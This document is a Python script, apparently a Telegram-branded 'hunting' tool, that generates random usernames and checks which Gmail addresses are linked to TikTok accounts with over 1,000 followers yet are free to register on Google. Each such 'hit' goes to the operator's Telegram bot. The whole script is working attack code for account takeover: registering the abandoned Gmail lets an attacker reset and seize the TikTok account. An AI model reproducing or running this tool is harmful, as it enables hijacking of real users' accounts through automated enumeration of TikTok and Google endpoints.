import requests
import random
import time
import json
import string
import os
import sys
import re
from threading import Thread, Lock
from user_agent import generate_user_agent as ua

# Colors
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = "\033[1;30m"
X = '\033[1;33m'
F = '\033[2;32m'
Z3 = '\033[1;31m'
L = "\033[1;95m"
C = '\033[2;35m'
A = '\033[2;39m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'

# Threading Safety
lock = Lock()
tiktok_good = 0
tiktok_bad = 0
email_good = 0
email_bad = 0

def elia5():
    sd = random.choice([J1, J2, J21, J22, F1, C1, P1, P2])
    os.system('clear||cls')
    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J22} [𝑬𝑳𝑰𝑨] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(sd + f"""

         ██╗ ███╗   ██╗ ███████╗ ████████╗  █████╗
         ██║ ████╗  ██║ ██╔════╝ ╚══██╔══╝ ██╔══██╗
         ██║ ██╔██╗ ██║ ███████╗    ██║    ███████║
         ██║ ██║╚██╗██║ ╚════██║    ██║    ██╔══██║
         ██║ ██║ ╚████║ ███████║    ██║    ██║  ██║
         ╚═╝ ╚═╝  ╚═══╝ ╚══════╝    ╚═╝    ╚═╝  ╚═╝

        {X}¸.•´¯`•.¸¸ {F} [꧁ 𝑬𝑳𝑰𝑨 - 𝑻𝑰𝑲𝑻𝑶𝑲 ꧂ ]    {X}¸.•´¯`•.¸¸                       
              {F}TLE : @ELIA_py / @XRRHX
    """)
    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J22} [𝑬𝑳𝑰𝑨] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")

elia5()
tok = input(' TOKEN : ')
iid = input(' ID : ')

def elia_innnn():
    with lock:
        sys.stdout.write(f"\r{X}Checked: {tiktok_good + tiktok_bad} • {F}Tiktok Reg: {tiktok_good} • {Z}Not Reg: {tiktok_bad} • {C1}Gmail Avail: {email_good} • {J2}Fail: {email_bad} ")
        sys.stdout.flush()

def elia88(username, followers):
    tlg = f'''
𝐓𝐈𝐊𝐓𝐎𝐊 𝐇𝐈𝐓 ✅
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
-𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : {username}
-𝗘𝗺𝗮𝗶𝗹 : {username}@gmail.com
-𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : {followers}
-𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗥𝗲𝗮𝗹 𝗛𝗶𝘁 ✅
-𝗡𝗼𝘁𝗲 : 𝗘𝗺𝗮𝗶𝗹 𝗶𝘀 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗳𝗼𝗿 𝗦𝗶𝗴𝗻𝗨𝗽!
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
    '''
    try:
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage", json={
            "chat_id": iid,
            "text": tlg,
            "reply_markup": {
                "inline_keyboard": [
                    [{"text": "ELIA", "url": "https://t.me/ELIA_Py"},
                     {"text": "Channel ", "url": "https://t.me/XRRHX"}]
                ]
            }
        })
    except:
        pass

def check_gmail_signup_availability(email):
    """
    فحص توفر بريد جيميل لإنشاء حساب جديد (SignUp)
    """
    try:
        username = email.split('@')[0]
        s = requests.Session()
        headers={'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8','user-agent':ua()}
        # طلب صفحة التسجيل للحصول على التوكينات (نفس منطق g1.py)
        res = s.get('https://accounts.google.com/lifecycle/flows/signup?service=mail', headers=headers)
        
        # إذا كانت كلمة password غير موجودة في الرد عند محاولة فحص اليوزر، يعني اليوزر متاح للتسجيل
        # سنستخدم المنطق المبسط والمجرب لفحص التوفر للتسجيل
        check_url = f"https://mail.google.com/mail/gxlu?email={email}"
        res_check = s.get(check_url, headers=headers, timeout=10)
        
        # في نظام جوجل، إذا لم يرجع الرد ملفات تعريف ارتباط معينة، فالبريد غالباً متاح للإنشاء
        if 'Set-Cookie' not in res_check.headers:
            return True
    except:
        pass
    return False

def check_tiktok_email_registered(email):
    """
    التأكد من أن الإيميل مرتبط فعلياً بحساب تيك توك
    """
    try:
        url = "https://www.tiktok.com/passport/email/check_email_registered"
        params = {"email": email, "aid": 1233}
        headers = {"User-Agent": ua()}
        res = requests.get(url, params=params, headers=headers, timeout=10).json()
        # إذا كانت القيمة 1، يعني الإيميل مسجل في تيك توك
        if res.get("is_registered") == 1:
            return True
    except:
        pass
    return False

def get_tiktok_followers(username):
    """
    جلب عدد المتابعين للتأكد من جودة الحساب
    """
    try:
        url = f"https://www.tiktok.com/@{username}"
        headers = {"User-Agent": ua()}
        res = requests.get(url, headers=headers, timeout=15)
        match = re.search(r'"followerCount":(\d+)', res.text)
        if match:
            return int(match.group(1))
    except:
        pass
    return 0

def process_username(username):
    global tiktok_good, tiktok_bad, email_good, email_bad
    email = f"{username}@gmail.com"
    
    # 1. التأكد أن الإيميل مرتبط بتيك توك أولاً
    if check_tiktok_email_registered(email):
        with lock: tiktok_good += 1
        elia_innnn()
        
        # 2. التأكد من عدد المتابعين (1000+)
        followers = get_tiktok_followers(username)
        if followers >= 1000:
            
            # 3. التأكد أن الإيميل متاح للإنشاء (SignUp) في جوجل
            if check_gmail_signup_availability(email):
                with lock: email_good += 1
                elia_innnn()
                elia88(username, followers)
            else:
                with lock: email_bad += 1
                elia_innnn()
    else:
        with lock: tiktok_bad += 1
        elia_innnn()

def start_hunting():
    # توليد يوزرات ذكية تعتمد على كلمات شائعة لزيادة احتمالية الصيد
    words = ["user", "admin", "king", "star", "pro", "dark", "light", "love", "life", "official"]
    while True:
        base = random.choice(words)
        suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(2, 4)))
        username = base + suffix
        process_username(username)
        time.sleep(random.uniform(1, 2))

# تشغيل الخيوط
threads_count = 8
for i in range(threads_count):
    t = Thread(target=start_hunting)
    t.daemon = True
    t.start()

while True:
    time.sleep(1)
